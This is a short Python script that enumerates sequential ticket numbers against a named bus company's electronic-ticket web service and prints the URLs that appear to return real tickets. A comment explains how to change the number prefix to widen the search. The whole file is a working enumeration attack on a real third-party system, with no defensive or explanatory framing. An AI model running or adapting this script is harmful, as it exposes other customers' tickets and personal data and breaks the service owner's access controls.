import requests
url = 'http://www.ado.com.mx/ado2/WSCCPA/BOLWS/BoletosElectronico'
'''
This prefix variable can be modified to a smaller value. i.e. 200020000, 200010000, etc
'''
prefix = '200021956'

for counter in range(1,20):
	sufix = str(counter).zfill(3)
	numero = prefix + sufix
	r = requests.get(url, params = {'numero':numero})
	if not 'Content-Length' in r.headers:
		print r.url